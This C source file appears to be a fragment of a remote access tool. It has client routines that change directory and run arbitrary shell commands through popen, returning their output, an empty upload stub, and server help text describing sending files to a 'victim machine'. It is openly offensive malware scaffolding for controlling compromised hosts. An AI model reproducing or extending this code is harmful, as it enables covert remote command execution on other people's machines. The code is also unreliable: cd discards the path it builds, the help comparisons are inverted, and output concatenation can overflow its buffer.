#include "include.h"


/* Client commands */
void cd(char *path){
    int output;
    char *username;
    char *new_path;

    if(strcmp(path, "home") == 0){
        username = getlogin();
        new_path = (char *)malloc(sizeof(char) * strlen(username) + 9);
        strcpy(new_path, "/home/");
        strcat(new_path, username);
    }
    new_path = path;
    chdir(new_path);
}

void upload(char *path){

}

char * execute(char * command){
    FILE *fpipe;
    char line[256];
    char *output;
    
    output = (char *)malloc(sizeof(char) * MAX_TERMINAL_OUTPUT);
    memset(output, 0, MAX_TERMINAL_OUTPUT);

    if (!(fpipe = (FILE*)popen(command,"r"))){
        return NULL;
    }

    while ( fgets( line, 256, fpipe)){
        strcat(output, line);
    }
    pclose(fpipe);
    return output;
}


/* Server functions */
void help(char * command){
    
    if(strcmp(command, "default")){
        printf("Commands: \n");
        printf("Upload\nHelp");

    }
    else if(strcmp(command, "help") == 0){
        printf("This command display information about other commands\n");
        printf("Usage:\nhelp <command>");
    }
    else if(strcmp(command, "upload")){
        printf("Upload command is used to send file to victim machine\n");
        printf("Usage:\nupload <path/to/file>");
    }
}